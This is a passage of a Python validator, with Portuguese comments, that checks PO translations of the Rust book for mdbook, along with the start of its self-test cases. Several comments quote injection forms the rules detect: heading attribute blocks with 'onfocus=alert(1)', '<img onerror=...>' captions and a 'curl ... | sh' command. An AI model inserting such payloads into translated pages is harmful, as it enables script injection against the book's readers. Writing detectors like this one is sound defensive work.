            "o gettext o trataria como traduzido e o livro mostraria um parágrafo vazio")


def _regra_nao_traduzivel(msgid, msgstr, add):
    t = po_util.tipo(msgid.original)
    if t in ("codigo", "ancora", "comentario") and msgstr.original != "":
        add("nao_traduzivel", "erro",
            f"mensagem do tipo '{t}' não se traduz: o msgstr deve ficar vazio")


def _regra_code_spans(msgid, msgstr, add):
    falta = _diferenca(msgid.codigos, msgstr.codigos)
    sobra = _diferenca(msgstr.codigos, msgid.codigos)
    if not falta and not sobra:
        return

    def fmt(par):
        n, conteudo = par
        if isinstance(n, str):                 # "<code>" ou "<pre>"
            return n + conteudo + n.replace("<", "</")
        return "`" * n + conteudo + "`" * n

    partes = []
    if falta:
        partes.append("faltam no msgstr " + _lista(map(fmt, falta)))
    if sobra:
        partes.append("sobram no msgstr " + _lista(map(fmt, sobra)))
    add("code_spans", "erro",
        "trechos de código inline diferentes (o código não se traduz): " + "; ".join(partes))


def _regra_aninhamento(msgid, msgstr, add):
    limite = max(_MAX_ANINHAMENTO, msgid.prof_colchetes)
    if msgstr.prof_colchetes > limite:
        add("aninhamento", "erro",
            f"colchetes aninhados em excesso no msgstr: {msgstr.prof_colchetes} níveis "
            f"(o msgid tem {msgid.prof_colchetes}; texto real não passa de {_MAX_ANINHAMENTO})")


def _regra_links(msgid, msgstr, add):
    falta = _diferenca(msgid.destinos, msgstr.destinos)
    sobra = _diferenca(msgstr.destinos, msgid.destinos)
    if not falta and not sobra:
        return
    partes = []
    if falta:
        partes.append("faltam no msgstr " + _lista(falta))
    if sobra:
        partes.append("sobram no msgstr " + _lista(sobra))
    add("links", "erro", "destinos de links `](...)` diferentes: " + "; ".join(partes))


def _regra_referencias(msgid, msgstr, add):
    no_id = set(msgid.rotulos)
    no_str = set(msgstr.rotulos)

    def mostra(analise, chaves):
        # forma original do rótulo (com a caixa e o código inline do texto), entre colchetes
        return _lista(f"[{analise.rotulos_originais.get(c, c)}]" for c in chaves)

    falta = sorted(no_id - no_str)
    if falta:
        dicas = []
        if any(c.startswith("^") for c in falta):
            dicas.append("mantenha a nota de rodapé `[^x]` exatamente como está no original")
        if any(not c.startswith("^") for c in falta):
            dicas.append("um `[rótulo]` traduzido sem definição vira texto solto: mantenha o "
                         "rótulo idêntico ao original ou use `[texto traduzido][rótulo]` "
                         "com o rótulo original")
        add("referencias", "erro",
            "rótulos de referência do msgid ausentes no msgstr: " + mostra(msgid, falta)
            + " (" + "; ".join(dicas) + ")")
    # Rótulo novo cuja definição `[rótulo]: destino` está no próprio msgstr vira link de verdade para um
    # destino que a regra links não vê; sem definição ele aparece como texto entre colchetes (o mdbook
    # traduz mensagem a mensagem: uma definição da página inglesa não alcança o `[rótulo]` do msgstr,
    # salvo na nota de rodapé `[^n]`, que se liga à nota da página).
    novos = sorted(no_str - no_id)
    definidos = {chave for chave, _destino in msgstr.definicoes}
    com_definicao = [c for c in novos if c in definidos]
    if com_definicao:
        add("referencias", "erro",
            "rótulos de referência que o msgid não tem e que o próprio msgstr define: "
            + mostra(msgstr, com_definicao) + " (a definição os transforma em links de verdade no começo do "
            "msgstr ou depois de linha em branco, e em notas de rodapé em qualquer começo de linha; em outra "
            "posição o link sai como texto, mas é recusado por precaução; tire-a)")
    sem_definicao = [c for c in novos if c not in definidos]
    if sem_definicao and not falta:
        add("referencias", "aviso",
            "rótulos de referência que o msgid não tem: " + mostra(msgstr, sem_definicao)
            + " (sem definição no próprio msgstr aparecem como texto entre colchetes, mesmo que a página "
            "os defina em outro lugar; só a nota de rodapé `[^n]` se liga à nota da página)")


def _listing_sozinho(a):
    """True se a mensagem abre com a tag <Listing ...> inteira numa linha e sozinha nela.

    É a forma que o mdbook-trpl-listing reconhece (a tag tem de ser um bloco HTML): texto antes,
    quebra de linha dentro da tag ou texto depois dela, na mesma linha, a fazem virar HTML em
    linha, e o `</Listing>` seguinte fica sem abertura (o build pt-BR inteiro falha).
    """
    primeiro = a.mascarado[:1]
    bruto = a.marcadores.texto.get(primeiro, "")
    m = _RE_NOME_TAG.match(bruto)
    return (bool(m) and m.group(2) == "Listing" and not m.group(1) and "\n" not in bruto
            and not a.mascarado[1:].split("\n", 1)[0].strip())


def _regra_listing(msgid, msgstr, add):
    a = _tags_listing(msgid)
    b = _tags_listing(msgstr)
    if not a and not b:
        return
    if len(a) != len(b):
        add("listing", "erro",
            f"quantidade de <Listing> diferente: msgid tem {len(a)}, msgstr tem {len(b)}")
        return
    if _listing_sozinho(msgid) and not _listing_sozinho(msgstr):
        add("listing", "erro",
            "a tag <Listing ...> tem de abrir o msgstr, inteira numa linha e sozinha nela, "
            "como no msgid (senão o mdbook-trpl-listing não a reconhece e o build falha)")
        return
    for k, (ta, tb) in enumerate(zip(a, b), 1):
        da = {n: v for n, v in ta[2]}
        db = {n: v for n, v in tb[2]}
        rotulo = f"<Listing> {k}" if len(a) > 1 else "<Listing>"
        for nome in sorted((set(da) | set(db)) - {"caption"}):
            if da.get(nome, "<ausente>") != db.get(nome, "<ausente>"):
                add("listing", "erro",
                    f"{rotulo}: atributo {nome}= deve ficar idêntico "
                    f"(msgid {_mostra(da.get(nome, '<ausente>'))}, msgstr {_mostra(db.get(nome, '<ausente>'))})")
        legenda_id = bool(da.get("caption"))
        legenda_str = bool(db.get("caption"))
        if legenda_id and not legenda_str:
            add("listing", "erro",
                f"{rotulo}: a legenda (caption=) do msgid falta ou está vazia no msgstr")
        elif legenda_str and "caption" not in da:
            add("listing", "erro",
                f"{rotulo}: o msgid não tem legenda (caption=) e o msgstr inventou uma")
        if legenda_id and legenda_str:
            _regra_legenda(rotulo, da["caption"], db["caption"], add)


def _regra_legenda(rotulo, legenda_id, legenda_str, add):
    """Confere o valor de caption= do msgstr com o do msgid, cada um como um texto à parte.

    O mdbook-trpl-listing passa a legenda pelo pulldown-cmark e põe o HTML, o cru inclusive, no
    <figcaption>: um link, uma imagem, um autolink ou uma tag acrescentados chegam ao livro (um
    `<img onerror=...>` é script), e o parser liga os atributos de título: `# texto {onfocus=...}`
    vira um `<h1 onfocus=...>` (a regra estrutura recusa o título). O mascaramento do <Listing>
    escondeu o valor das regras do texto, então elas rodam aqui sobre a legenda; os achados levam o
    nome delas e o prefixo da legenda.
    A legenda é lida sozinha, sem definições de outro lugar: um rótulo de referência novo nela é
    erro, não aviso. Só o caption= vai ao parser Markdown (o book.toml só configura trpl-note e
    trpl-listing), então title= e alt= ficam como estão.
    """
    a = _Analise(legenda_id)
    b = _Analise(legenda_str)

    def add_legenda(regra, severidade, mensagem):
        if regra == "referencias":
            severidade = "erro"
        add(regra, severidade, f"{rotulo}: na legenda (caption=), {mensagem}")

    for regra in (_regra_links, _regra_referencias, _regra_definicoes, _regra_tags_html,
                  _regra_atributos_html, _regra_html_bloco, _regra_estrutura, _regra_url_nua):
        regra(a, b, add_legenda)


def _chave_tag(t):
    return ("/" if t[1] else "") + t[0]


def _regra_tags_html(msgid, msgstr, add):
    # Só a ABERTURA do <Listing> sai daqui (a regra listing a confere); o `</Listing>` acrescentado
    # no msgstr deixaria o mdbook-trpl-listing sem abertura e derrubaria o build inteiro.
    a = [_chave_tag(t) for t in msgid.tags if t[0] != "Listing" or t[1]]
    b = [_chave_tag(t) for t in msgstr.tags if t[0] != "Listing" or t[1]]
    falta = _diferenca(a, b)
    sobra = _diferenca(b, a)
    if not falta and not sobra:
        return
    partes = []
    if falta:
        partes.append("faltam no msgstr " + _lista(f"<{x}>" for x in falta))
    if sobra:
        partes.append("sobram no msgstr " + _lista(f"<{x}>" for x in sobra))
    add("tags_html", "erro", "tags HTML diferentes: " + "; ".join(partes))


def _atributos_fixos(a):
    saida = []
    for nome, fechando, attrs, _bruto in a.tags:
        if fechando or nome == "Listing":
            continue
        for atributo, valor in attrs:
            if atributo.lower() not in _ATRIBUTOS_TRADUZIVEIS:
                saida.append(f"<{nome} {atributo}>" if valor is None else f'<{nome} {atributo}="{valor}">')
    return saida


def _regra_atributos_html(msgid, msgstr, add):
    a = _atributos_fixos(msgid)
    b = _atributos_fixos(msgstr)
    falta = _diferenca(a, b)
    sobra = _diferenca(b, a)
    if not falta and not sobra:
        return
    partes = []
    if falta:
        partes.append("faltam ou mudaram no msgstr " + _lista(falta))
    if sobra:
        partes.append("sobram no msgstr " + _lista(sobra))
    add("atributos_html", "erro",
        "atributos HTML que não são texto (id, href, src, class...) têm de ficar idênticos: "
        + "; ".join(partes))


def _regra_ignore(msgid, msgstr, add):
    if msgid.n_ignore != msgstr.n_ignore:
        add("ignore", "erro",
            f"quantidade de `<!-- ignore -->` diferente: msgid {msgid.n_ignore}, msgstr {msgstr.n_ignore}")


def _regra_html_bloco(msgid, msgstr, add):
    # Uma linha que abre um bloco HTML cru sem fechá-lo atravessa as linhas em branco: o mdbook
    # reanalisa a página inteira e os parágrafos seguintes caem dentro do bloco e somem do livro.
    # O mascaramento já tirou os comentários e as tags completos; aqui só sobra o que não fecha ou
    # está malformado (o `<div =x onmouseover=...>` do tipo 6 vira bloco HTML cru e chega ao livro).
    a = _RE_BLOCO_HTML.findall(msgid.mascarado)
    b = _RE_BLOCO_HTML.findall(msgstr.mascarado)
    sobra = _diferenca(map(str.lower, b), map(str.lower, a))
    if sobra:
        add("html_bloco", "erro",
            "início de bloco HTML sem fechamento ou com a tag malformada no msgstr: " + _lista(sobra)
            + " (esconde o resto da página ou deixa passar atributos de HTML cru; escreva a tag inteira "
            "ou tire o trecho)")
    abre_id = msgid.original.count("<!--")
    abre_str = msgstr.original.count("<!--")
    if abre_str > abre_id:
        add("html_bloco", "erro",
            f"o msgstr tem {abre_str} `<!--` e o msgid {abre_id}: comentário HTML acrescentado "
            "(ou sem `-->`) esconde texto do livro")


def _texto_versoes(a):
    """Texto onde procurar versões/datas: o texto visível mais os valores dos atributos
    traduzíveis das tags (caption= do <Listing>, alt=, title=...), que o mascaramento
    das tags tirou de `sem_destinos` mas que o tradutor também escreve."""
    partes = [a.sem_destinos]
    for _nome, _fechando, attrs, _bruto in a.tags:
        partes.extend(v for k, v in attrs if v and k.lower() in _ATRIBUTOS_TRADUZIVEIS)
    return "\n".join(partes)


def _versoes(a):
    texto = _texto_versoes(a)
    return Counter(_RE_VERSAO.findall(texto) + _RE_DATA.findall(texto))


def _regra_versoes(msgid, msgstr, add):
    vi = _versoes(msgid)
    vs = _versoes(msgstr)
    falta = sorted(set(vi) - set(vs))
    if falta:
        add("versoes", "erro",
            "versão/data do msgid ausente no msgstr: " + _lista(falta)
            + " (o número deve acompanhar o original; não vale como parte de outro número)")
    # "10,800" no original vira "10.800" em português: separador de milhar, não versão
    texto_id = _texto_versoes(msgid)
    sobra = sorted(t for t in set(vs) - set(vi)
                   if not (_RE_MILHAR_PT.fullmatch(t) and t.replace(".", ",") in texto_id))
    if sobra and not falta:
        add("versoes", "aviso",
            "versão/data que só existe no msgstr: " + _lista(sobra)
            + " (resto de tradução antiga?)")


def _parece_titulo(msgid):
    m = msgid.strip()
    return bool(m) and "\n" not in m and len(m) <= 150 and not m.endswith((".", ":", ";", ","))


def _blocos_no_fim(a):
    """Blocos `{...}` no fim de linha do texto de `a`, sem os slugs `{#id}` (a regra deles é a _regra_slug).

    O texto é o que o mdbook lê do título depois da ida e volta do gettext: as referências de `{`, `}` e espaço
    já viraram o caractere, e o código inline e as tags voltaram ao lugar, porque pulldown-cmark procura o `{` no
    texto cru e aceita o de dentro de um código (`` Usando `x{` onfocus=alert(1)} ``). O código além do teto de
    marcadores (`_MARCADOR_EXCESSO`) se perdeu: conta como um `{` possível. Um `{#` colado a outro `{`
    (`{{#x onfocus=y}`) não é slug para a _regra_slug, mas o mdbook o lê como atributos: entra aqui.
    """
    texto = a.marcadores.restaura(a.decodificado.replace(_MARCADOR_EXCESSO, "{"))
    return [m.group(0) for m in _RE_BLOCO_NO_FIM.finditer(texto)
            if not (m.group(0).startswith("{#") and texto[m.start() - 1:m.start()] != "{")]


def _regra_blocos_no_fim(msgid, msgstr, add):
    # O mdbook liga os atributos de título: `## Título {tabindex=0 autofocus onfocus=alert(1)}` vira
    # `<h2 tabindex="0" autofocus onfocus="alert(1)">`, que roda ao carregar a página. O msgstr de um título
    # volta ao livro como o texto da linha `## ...`, então o `{...}` acrescentado a ele fica no fim dela (num
    # título setext, de lista ou de citação também). A regra olha toda linha, sem separar título de parágrafo:
    # nenhum msgid do livro termina em `{...}` fora o slug, e o bloco que o msgid já tem não conta.
    novos = Counter(_blocos_no_fim(msgstr))
    if not novos:
        return
    novos.subtract(Counter(_blocos_no_fim(msgid)))
    sobra = sorted(b for b, n in novos.items() if n > 0)
    for bloco in sobra[:_MAX_SLUGS_RELATADOS]:
        add("slug", "erro",
            f"bloco {_mostra(bloco)} no fim da linha: num título o mdbook o lê como atributos HTML (id, classe, "
            "onfocus=...) e eles chegam ao livro; só o slug `{#id}`, posto pelo slugs.py, pode ficar no fim")
    if len(sobra) > _MAX_SLUGS_RELATADOS:
        add("slug", "erro", f"... e mais {len(sobra) - _MAX_SLUGS_RELATADOS} bloco(s) `{{...}}` no fim da linha")


def _regra_slug(msgid, msgstr, add):
    _regra_blocos_no_fim(msgid, msgstr, add)
    s = msgstr.decodificado
    achados = list(_RE_SLUG_QUALQUER.finditer(s))
    if not achados:
        return
    problemas = 0
    fim_util = len(s.rstrip())            # depois dele só há espaço em branco (sem fatiar o resto a cada slug)
    for m in achados:
        bem_formado = bool(m.group(2)) and bool(_RE_SLUG_VALIDO.fullmatch(m.group(1)))
        no_fim = m.end() >= fim_util
        texto = "{#" + m.group(1) + m.group(2)
        if not bem_formado:
            problemas += 1
            if problemas <= _MAX_SLUGS_RELATADOS:
                add("slug", "erro",
                    f"slug malformado {_mostra(texto)}: use `{{#id}}` com apenas [A-Za-z0-9_.:-] "
                    "(outros caracteres vazam no menu lateral)")
        elif not no_fim:
            problemas += 1
            if problemas <= _MAX_SLUGS_RELATADOS:
                add("slug", "erro", f"slug {_mostra(texto)} fora do fim da mensagem: `{{#id}}` só vale no fim")
    if problemas > _MAX_SLUGS_RELATADOS:
        add("slug", "erro", f"... e mais {problemas - _MAX_SLUGS_RELATADOS} slug(s) `{{#...}}` com problema")
    if len(achados) > 1 and all(bool(m.group(2)) for m in achados):
        add("slug", "erro", f"{len(achados)} slugs `{{#...}}` no msgstr: só pode haver um, no fim")
    if (len(achados) == 1 and not _RE_SLUG_QUALQUER.search(msgid.decodificado)
            and not _parece_titulo(msgid.original)):
        add("slug", "aviso", "slug `{#...}` em mensagem que não parece um título (só títulos levam slug)")


def _regra_diretivas(msgid, msgstr, add):
    a = _RE_DIRETIVA.findall(msgid.mascarado)
    b = _RE_DIRETIVA.findall(msgstr.mascarado)
    falta = _diferenca(a, b)
    sobra = _diferenca(b, a)
    if falta or sobra:
        partes = []
        if falta:
            partes.append("faltam no msgstr " + _lista(falta))
        if sobra:
            partes.append("sobram no msgstr " + _lista(sobra))
        add("diretivas", "erro", "diretivas `{{#...}}` do mdbook diferentes: " + "; ".join(partes))


def _regra_bordas(msgid, msgstr, add):
    a, b = msgid.original, msgstr.original
    if not b:
        return
    if a.startswith("\n") != b.startswith("\n"):
        add("bordas", "erro",
            "msgid e msgstr não começam com '\\n' nos mesmos casos (o msgfmt --check recusa)")
    if a.endswith("\n") != b.endswith("\n"):
        add("bordas", "erro",
            "msgid e msgstr não terminam com '\\n' nos mesmos casos (o msgfmt --check recusa)")


def _com_quebras(a):
    """O texto mascarado, com a volta do original no lugar do que atravessa linhas.

    O parser divide os blocos linha a linha ANTES de ler código inline, tags e comentários: um `# `,
    `> ` ou `- ` no começo de uma linha de dentro deles (`</kbd\n> # x {onfocus=...}`) abre bloco do
    mesmo jeito, e o mascaramento o esconderia.
    """
    texto = a.marcadores.texto
    if not any("\n" in t for t in texto.values()):
        return a.mascarado
    return _RE_PRIVADO.sub(lambda m: texto[m.group(0)] if "\n" in texto.get(m.group(0), "") else m.group(0),
                           a.mascarado)


def _blocos(a):
    """Conta os marcadores de bloco Markdown no começo das linhas: Counter {descrição: quantos}.

    O mdbook-gettext analisa o msgstr como Markdown: `# ` vira título, `> ` citação, `- ` ou `1. `
    lista, recuo de 4 espaços bloco de código, `---` título setext e linha vazia parágrafo novo.
    O recuo e o `N.` com N diferente de 1 só abrem bloco no início ou depois de linha vazia (no
    meio de um parágrafo são continuação). Código inline, tags e comentários já estão mascarados,
    menos as quebras de linha de dentro deles (_com_quebras).
    """
    contagem = Counter()
    depois_de_vazia = True
    texto = _com_quebras(a).strip("\n")
    if not texto.strip():                  # só espaços: a regra 'vazio' cuida
        return contagem
    for linha in texto.split("\n"):
        if not linha.strip():
            contagem["linha vazia (parágrafo novo)"] += 1
            depois_de_vazia = True
            continue
        if _RE_RECUO.match(linha):
            if depois_de_vazia:
                contagem["recuo de código (4 espaços ou tab)"] += 1
        else:
            numerado = _RE_NUMERADO.match(linha)
            if numerado and (depois_de_vazia or numerado.group(1) == "1"):
                contagem["item numerado (1.)"] += 1
            for nome, padrao in _BLOCOS_MARKDOWN:
                if padrao.match(linha):
                    contagem[nome] += 1
        depois_de_vazia = False
    return contagem


def _regra_estrutura(msgid, msgstr, add):
    a = _blocos(msgid)
    b = _blocos(msgstr)
    a_mais = [(nome, b[nome], a[nome]) for nome in b if b[nome] > a[nome]]
    if a_mais:
        add("estrutura", "erro",
            "estrutura de blocos Markdown diferente do msgid (a tradução vira título, citação, lista, "
            "código ou parágrafo novo no livro; mantenha o msgstr no formato do msgid): "
            + "; ".join(f"{nome}: msgstr {n_str}, msgid {n_id}" for nome, n_str, n_id in a_mais))


def _regra_definicoes(msgid, msgstr, add):
    # Uma linha `[rótulo]: destino` define o destino de todo `[texto][rótulo]`, e no começo do msgstr (ou
    # depois de uma linha em branco) o mdbook 0.5.1 a lê como definição mesmo sem nenhum uso no texto; depois
    # de uma quebra simples ela sai como texto, e recusá-la é o conservador. Já a nota de rodapé `[^x]:` vira
    # nota em qualquer começo de linha, mesmo no meio do parágrafo. A regra links só vê `](...)` e `<url>`:
    # sem esta, a definição é a porta para um destino novo.
    sobra = _diferenca(msgstr.definicoes, msgid.definicoes)
    if sobra:
        add("definicoes", "erro",
            "linha de definição `[rótulo]: destino` que o msgid não tem: "
            + _lista(msgstr.definicoes_texto[par] for par in sobra)
            + " (no começo do msgstr ou depois de linha em branco ela vira um link de verdade, com destino novo; "
            "a de nota de rodapé `[^x]:` vira nota em qualquer começo de linha; em outra posição a de link "
            "sai como texto, mas é recusada por precaução; tire a linha)")


def _urls_nuas(texto):
    """URLs `http(s)://` de `texto`, sem a pontuação final e sem o que vem depois de um marcador."""
    saida = set()
    for m in _RE_URL.finditer(texto):
        url = _RE_PRIVADO.split(m.group(0), 1)[0].rstrip(_PONTUACAO_URL)
        if url.partition("//")[2]:
            saida.add(url)
    return saida


def _regra_url_nua(msgid, msgstr, add):
    # O mdbook não torna uma URL nua em link, mas o texto acrescentado pode ser um endereço ou um comando
    # (`curl ... | sh`) que o leitor copia. Vale a URL em qualquer parte do msgid (texto, destino de link,
    # código, tag, comentário): o msgstr pode repeti-la em outro lugar da frase.
    no_id = _urls_nuas("\n".join([msgid.sem_destinos, *msgid.destinos, *msgid.marcadores.texto.values()]))
    novas = sorted(_urls_nuas(msgstr.sem_destinos) - no_id)
    if novas:
        add("url_nua", "aviso",
            "URL no texto do msgstr que o msgid não tem: " + _lista(novas)
            + " (não vira link, mas pode ser endereço ou comando acrescentado; confira)")


def _regra_identico(msgid, msgstr, add):
    if po_util.tipo(msgid.original) != "prosa":
        return
    # o ` {#id}` que o apply.py e o slugs.py põem no fim dos títulos não faz do inglês uma tradução
    if _sem_slug_final(msgstr.original).strip() == msgid.original.strip() and msgid.palavras() >= 4:
        add("identico", "aviso", "msgstr idêntico ao msgid (parece texto sem tradução)")


def _eh_pontuacao(c):
    return ("\ue000" <= c <= "\uf8ff") or unicodedata.category(c)[0] in "PS"


def _sem_slug_final(s):
    """Tira um ` {#id}` do fim de `s` (sem regex com \\s*, que seria quadrática)."""
    t = s.rstrip()
    if t.endswith("}"):
        i = t.rfind("{#")
        if i >= 0 and _RE_SLUG_FINAL.fullmatch(t, i):
            return t[:i]
    return s


def _marcadores_enfase(a):
    """(itálicos, negritos): conta sequências de * ou _ que podem abrir/fechar ênfase."""
    s = _RE_URL.sub(" ", a.sem_destinos)
    s = _sem_slug_final(s)
    n = len(s)
    em = forte = 0
    i = 0
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c not in "*_":
            i += 1
            continue
        j = i
        while j < n and s[j] == c:
            j += 1
        antes = s[i - 1] if i > 0 else " "
        depois = s[j] if j < n else " "
        esp_a, esp_d = antes.isspace(), depois.isspace()
        pont_a, pont_d = _eh_pontuacao(antes), _eh_pontuacao(depois)
        esquerda = not esp_d and (not pont_d or esp_a or pont_a)
        direita = not esp_a and (not pont_a or esp_d or pont_d)
        if c == "*":
            vale = esquerda or direita
        else:
            vale = (esquerda and (not direita or pont_a)) or (direita and (not esquerda or pont_d))
        if vale:
            tam = j - i
            forte += tam // 2
            em += tam % 2
        i = j
    return em, forte


def _regra_enfase(msgid, msgstr, add):
    a = _marcadores_enfase(msgid)
    b = _marcadores_enfase(msgstr)
    if a != b:
        add("enfase", "aviso",
            f"marcadores de ênfase diferentes: msgid tem {a[0]} de itálico (_x_, *x*) e {a[1]} de negrito (**x**), "
            f"msgstr tem {b[0]} e {b[1]}")


_FUNCOES = {
    "caracteres": _regra_caracteres,
    "vazio": _regra_vazio,
    "nao_traduzivel": _regra_nao_traduzivel,
    "aninhamento": _regra_aninhamento,
    "code_spans": _regra_code_spans,
    "links": _regra_links,
    "referencias": _regra_referencias,
    "listing": _regra_listing,
    "tags_html": _regra_tags_html,
    "atributos_html": _regra_atributos_html,
    "ignore": _regra_ignore,
    "html_bloco": _regra_html_bloco,
    "versoes": _regra_versoes,
    "slug": _regra_slug,
    "diretivas": _regra_diretivas,
    "bordas": _regra_bordas,
    "estrutura": _regra_estrutura,
    "definicoes": _regra_definicoes,
    "url_nua": _regra_url_nua,
    "identico": _regra_identico,
    "enfase": _regra_enfase,
}
_NAO_TRADUZIVEIS = ("caracteres", "vazio", "nao_traduzivel")


def _validar(msgid, msgstr):
    """Todas as regras. Devolve [(regra, severidade, mensagem)]; nunca levanta exceção."""
    msgid = _texto(msgid)
    msgstr = _texto(msgstr)
    achados = []

    def add(regra, severidade, mensagem):
        achados.append((regra, severidade, mensagem))

    if msgstr == "":
        return achados                      # entrada ainda sem tradução: nada a validar
    try:
        a = _Analise(msgid)
        b = _Analise(msgstr)
    except Exception as exc:                # nunca deve acontecer; não derruba o lote
        add(_REGRA_INTERNA, "erro", f"falha interna ao analisar a mensagem: {type(exc).__name__}: {_mostra(exc)}")
        return achados
    nao_traduzivel = po_util.tipo(msgid) in ("codigo", "ancora", "comentario")
    for regra in REGRAS:
        if nao_traduzivel and regra not in _NAO_TRADUZIVEIS:
            continue                        # em código só importa o msgstr estar vazio
        try:
            _FUNCOES[regra](a, b, add)
        except Exception as exc:
            add(regra, "erro", f"falha interna na regra '{regra}': {type(exc).__name__}: {_mostra(exc)}")
    return achados


def validar_par(msgid, msgstr):
    """Valida a tradução `msgstr` de `msgid`. Devolve [(severidade, mensagem)].

    severidade é 'erro' (a tradução não deve ser aceita) ou 'aviso'. Um msgstr vazio
    não tem o que validar e devolve lista vazia. Não levanta exceção.
    """
    return [(sev, msg) for _regra, sev, msg in _validar(msgid, msgstr)]


# --------------------------------------------------------------------------
# Integração com check.py
# --------------------------------------------------------------------------

def _como_no_livro(e, severidade, mensagem):
    """(severidade, mensagem) de um achado da entrada `e`, conforme o que o livro mostra dela.

    Numa entrada fuzzy o msgstr não aparece (vale o inglês): o 'erro' vira 'aviso' e a mensagem
    leva a marca [fuzzy]. A exceção são as entradas do src/SUMMARY.md: antes de traduzir, o
    mdbook-gettext reinsere o msgstr de cada mensagem do sumário, fuzzy ou não, e ele vai para o
    menu, o cabeçalho e o <title>; o erro continua erro, com a marca [fuzzy, aparece no menu].
    """
    if "fuzzy" not in e.flags:
        return severidade, mensagem
    if any(Path(a).name == "SUMMARY.md" for a in po_util.arquivos(e)):
        return severidade, "[fuzzy, aparece no menu] " + mensagem
    return "aviso", "[fuzzy] " + mensagem


def run(ctx):
    """Check `mensagens`: valida msgid x msgstr das entradas traduzidas e fuzzy do escopo.

    Em entradas fuzzy o msgstr não aparece no livro (vale o inglês), então os 'erro' viram
    'aviso' e a mensagem da regra leva a marca [fuzzy] logo depois do nome dela, como em
    '[code_spans] [fuzzy] ...'. Nas entradas do src/SUMMARY.md o erro continua erro
    (`_como_no_livro`).
    """
    from checks.base import Achado          # import tardio (CONTRATO §6): validar_par não depende de base.py

    achados = []
    for e in ctx.entradas(incluir_vazias=True):
        if e.msgstr == "":                   # msgstr só com espaços é validado (regra 'vazio')
            continue
        arquivo = ctx.arquivo_de(e)
        for regra, severidade, mensagem in _validar(e.msgid, e.msgstr):
            severidade, mensagem = _como_no_livro(e, severidade, mensagem)
            achados.append(Achado(NOME, severidade, f"[{regra}] {mensagem}", arquivo=arquivo,
                                  id=po_util.entry_id(e), msgid=e.msgid))
    return achados


# --------------------------------------------------------------------------
# Autoteste: (regra, esperado, msgid, msgstr, descrição)
#   esperado 'erro'/'aviso': a regra tem de apontar com essa severidade;
#   esperado None: a regra não pode apontar nada.
# --------------------------------------------------------------------------

_LISTING = '<Listing number="2-1" file-name="src/main.rs" caption="Reads a `guess`">\n'
_LISTING_PT = '<Listing number="2-1" file-name="src/main.rs" caption="Lê um `guess`">\n'


def _listing_com(legenda):
    """A tag <Listing> dos casos, com `legenda` no caption=."""
    return f'<Listing number="2-1" file-name="src/main.rs" caption="{legenda}">\n'


# A entrada real 9e216b91061c (ch01-03), base dos casos de injeção por definição de link e por URL nua.
_CARGO = "For more information about Cargo, check out [its documentation](https://doc.rust-lang.org/cargo/)."
_CARGO_PT = "Para mais informações sobre Cargo, consulte [sua documentação](https://doc.rust-lang.org/cargo/)."

CASOS = [
    # nao_traduzivel
    ("nao_traduzivel", "erro", "```rust\nfn main() {}\n```", "```rust\nfn principal() {}\n```", "bloco de código traduzido"),
    ("nao_traduzivel", "erro", '"Hello, world!"', '"Olá, mundo!"', "literal de string traduzido"),
    ("nao_traduzivel", "erro", "// create a new variable", "// cria uma variável nova", "comentário // traduzido"),
    ("nao_traduzivel", "erro", '<a id="x"></a>', "x", "âncora com texto"),
    ("nao_traduzivel", "erro", "<!-- Old headings. Do not remove -->", "<!-- Títulos antigos -->", "comentário HTML traduzido"),
    ("nao_traduzivel", None, "```rust\nfn main() {}\n```", "", "código com msgstr vazio"),
    ("nao_traduzivel", None, "Hello there, friend of Rust.", "Olá, amigo do Rust.", "prosa traduzida"),
    # code_spans
    ("code_spans", None, "Call `expect` on it.", "Chame `expect` nele.", "trecho de código mantido"),
    ("code_spans", None, "Use `` `x` `` and `a`.", "Use `` `x` `` e `a`.", "trecho com várias crases mantido"),
    ("code_spans", None, "Use `a` and `a`.", "Use `a` e `a`.", "trecho repetido mantido"),
    ("code_spans", None, "The `s` value.", "O valor `s`.", "ordem diferente é aceita"),
    ("code_spans", "erro", "The `expect` method.", "O `método expect`.", "português dentro do código"),
    ("code_spans", "erro", "The `rand` crate.", "O `crate rand`.", "português dentro do código (2)"),
    ("code_spans", "erro", "Call `parse` on strings.", "Chame parse em strings, sem crases.", "trecho sem crases"),
    ("code_spans", "erro", "Use `a` and `b`.", "Use `a`.", "trecho removido"),
    ("code_spans", "erro", "Use `a`.", "Use `a` e `b`.", "trecho inventado"),
    ("code_spans", "erro", "Use `` `x` ``.", "Use `x`.", "número de crases diferente"),
    ("code_spans", "erro", "Use `a`.", "Use `a` `a`.", "trecho repetido a mais"),
    ("code_spans", None, "Escaped \\`not code\\` here.", "Crases \\`escapadas\\` aqui.", "crases escapadas não são código"),
    ("code_spans", "erro", "A ``a`b`` span.", "Um `a`b` trecho.", "multi-crase comparado exatamente"),
    ("code_spans", None, "Use <code>pat \\| pat</code> to match.", "Use <code>pat \\| pat</code> para casar.", "<code> mantido"),
    ("code_spans", "erro", "Use <code>pat \\| pat</code> to match.", "Use <code>padrão \\| padrão</code> para casar.",
     "código traduzido dentro de <code>"),
    ("code_spans", None, "<pre>\n<code>let <em>PATTERN</em> = x;</code>\n</pre>",
     "<pre>\n<code>let <em>PATTERN</em> = x;</code>\n</pre>", "<pre><code> mantido (conta uma vez)"),
    ("code_spans", "erro", "<pre>\n<code>let <em>PATTERN</em> = x;</code>\n</pre>",
     "<pre>\n<code>deixe <em>PADRÃO</em> = x;</code>\n</pre>", "código traduzido dentro de <pre><code>"),
    # links
    ("links", None, "See [the book](ch01.html#a)<!-- ignore -->.", "Veja [o livro](ch01.html#a)<!-- ignore -->.", "destino mantido"),
    ("links", None, "See ![alt](img/a.png).", "Veja ![texto](img/a.png).", "imagem mantida"),
    ("links", None, "See [a](url_(x)).", "Veja [a](url_(x)).", "parênteses balanceados no destino"),
    ("links", None, "See [a](https://x.org \"Title\").", "Veja [a](https://x.org \"Título\").", "título do link é traduzível"),
    ("links", None, "See <https://rust-book.cs.brown.edu>.", "Veja <https://rust-book.cs.brown.edu>.", "autolink mantido"),
    ("links", "erro", "Several community [translations](appendix-06-translation.html) exist.",
     "Várias \\[traduções\\] existem.", "link virou texto com colchetes escapados"),
    ("links", "erro", "See [a](x.html).", "Veja [a](y.html).", "destino alterado"),
    ("links", "erro", "See [a](x.html) and [b](x.html).", "Veja [a](x.html).", "destino repetido removido"),
    ("links", "erro", "See <https://a.org>.", "Veja <https://b.org>.", "autolink alterado"),
    ("links", "erro", "See [a](x.html).", "Veja [a](x.html) e [b](z.html).", "destino inventado"),
